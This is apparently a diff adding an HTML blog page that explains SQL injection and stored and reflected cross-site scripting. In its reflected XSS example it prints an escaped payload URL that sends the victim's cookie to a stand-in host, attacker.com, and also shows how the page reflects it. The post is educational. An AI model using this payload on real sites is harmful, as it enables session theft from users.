@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+
+    <!--- basic page needs
+    ================================================== -->
+    <meta charset="utf-8">
+    <title>Standard Post - Typerite</title>
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <!-- mobile specific metas
+    ================================================== -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- CSS
+    ================================================== -->
+    <link rel="stylesheet" href="css/base.css">
+    <link rel="stylesheet" href="css/vendor.css">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/custom.css">
+
+    <!-- script
+    ================================================== -->
+    <script src="js/modernizr.js"></script>
+
+    <!-- favicons
+    ================================================== -->
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="manifest" href="site.webmanifest">
+
+</head>
+
+<body class="ss-bg-white">
+
+    <!-- preloader
+    ================================================== -->
+    <div id="preloader">
+        <div id="loader" class="dots-fade">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+
+    <div id="top" class="s-wrap site-wrapper">
+
+        <!-- site header
+        ================================================== -->
+        <div id="site-header"></div>
+        <!-- site header end -->
+
+        <!-- site content
+        ================================================== -->
+        <div class="s-content content">
+            <main class="row content__page">
+                
+                <article class="column large-full entry format-gallery">
+
+                    <div class="media-wrap entry__media">
+                        <div class="entry__post-thumb">
+                            <img src="images/p3_r.jpg" 
+                                 srcset="images/p3_r.jpg 2000w, 
+                                         images/p3_r.jpg 1000w, 
+                                         images/p3_r.jpg 500w" sizes="(max-width: 2000px) 100vw, 2000px" alt="">
+                        </div>
+                    </div>
+
+                    <div class="content__page-header entry__header">
+                        <h1 class="display-2 entry__title">
+                        SQL Injection and XSS Security Threats
+                        </h1>
+                        <ul class="entry__header-meta">
+                            <li class="author">By <a href="#0">Pratyush Bansal</a></li>
+                            <li class="date">January 09, 2021</li>
+                            <li class="cat-links">
+                                <span>Security</span>
+                            </li>
+                        </ul>
+                    </div> <!-- end entry__header -->
+
+                    <div class="entry__content">
+
+
+                        <h3>SQL injection</h3>
+    
+                        <p>
+                        A SQL injection attack happens when structured query language (SQL) code is injected into forms, cookies, or http headers that do not use data sanitising or validation methods to verify the request. This flaw allows data extraction, changes, or deletion from databases that are connected to websites.
+                        </p>
+
+                        <h3>Cross-Site Scripting (XSS)</h3>
+    
+                        <p>
+                        An XSS attack uses malicious code to redirect users to malicious websites, steal cookies or credentials, or deface websites. This is usually accomplished using malicious scripts that are executed in client browsers as a result of user input, functional statements, client requests, or other expressions. </p>
+
+                        <p>There are major 2 types of cross site scripting, <span style="text-decoration:underline;">Stored XSS and Reflected XSS</span> 
+                        </p>
+
+                        <!-- wp:paragraph -->
+                        <p><strong>Stored XSS</strong></p>
+                        <!-- /wp:paragraph -->
+
+                        <!-- wp:paragraph -->
+                        <p>Stored XSS generally occurs when user input is stored on the target server, such as in a database, in a message forum, visitor log, comment field, etc. And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser.</p>
+                        <!-- /wp:paragraph -->
+
+                        <!-- wp:paragraph -->
+                        <p><strong>Reflected XSS</strong></p>
+                        <!-- /wp:paragraph -->
+
+                        <!-- wp:paragraph -->
+                        <p>Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response </p>
+                        <!-- /wp:paragraph -->
+
+                        <!-- wp:paragraph -->
+                        <p>Considering this through an example-</p>
+                        <!-- /wp:paragraph -->
+
+                        <!-- wp:list {"ordered":true} -->
+                        <ol><li>Suppose there is a search functionality in your application and let the search url be some like this https://example.com/news?q=data+breach In the search results the website reflects the content of the query that the user searched for, such as: You searched for "data breach"</li><li>If the Search functionality is vulnerable to a reflected cross-site scripting vulnerability, the attacker can send the victim a link such as the below </li></ol>
+                        <!-- /wp:list -->
+
+                        <!-- wp:code -->
+                        <pre class="wp-block-code"><code>https://example.com/news?q=&lt;script&gt;document.location='https://attacker.com/log.php?c=' + encodeURIComponent(document.cookie)&lt;/script&gt;</code></pre>
+                        <!-- /wp:code -->
+
+                        <!-- wp:list {"ordered":true,"start":3} -->
+                        <ol start="3"><li>Once the victim clicks on the link, the website will display the following</li></ol>
+                        <!-- /wp:list -->
+
+                        <!-- wp:code -->
+                        <pre class="wp-block-code"><code>You searched for "&lt;script&gt;document.location='https://attacker.com/log.php?c=' + document.cookie&lt;/script&gt;"</code></pre>
+                        <!-- /wp:code -->
+
+                        <!-- wp:paragraph -->
+                        <p>The HTML source code, which is reflecting the attacker's malicious code redirects the victim to a website that is controlled by the attacker, which can then record the user's current cookie for example.com as GET parameter. To sum it up, the main difference between a SQL and XSS injection attack is that SQL injection attacks are used to steal information from databases whereas XSS attacks are mainly used to redirect users to websites where attackers can steal data from them.</p>
+                        <!-- /wp:paragraph -->
+
+                        <p class="entry__tags">
+                            <span>Post Tags</span>
+        
+                            <span class="entry__tag-list">
+                                <a href="#0">Security</a>
+                                <a href="#0">XSS</a>
+                            </span>
+            
+                        </p>
+                    </div> <!-- end entry content -->
+
+
+        <!-- footer
+        ================================================== -->
+        <footer class="s-footer footer">
+            <div class="row">
+                <div class="column large-full footer__content">
+                    <div class="footer__copyright">
+                        <span>© Copyright Typerite 2019</span> 
+                        <span>Design by <a href="https://www.styleshout.com/">StyleShout</a></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="go-top">
+                <a class="smoothscroll" title="Back to Top" href="#top"></a>
+            </div>
+        </footer>
+
+    </div> <!-- end s-wrap -->
+
+
+    <!-- Java Script
+    ================================================== -->
+    <script src="js/jquery-3.2.1.min.js"></script>
+    <script src="js/plugins.js"></script>
+    <script src="js/main.js"></script>
+
+</body>
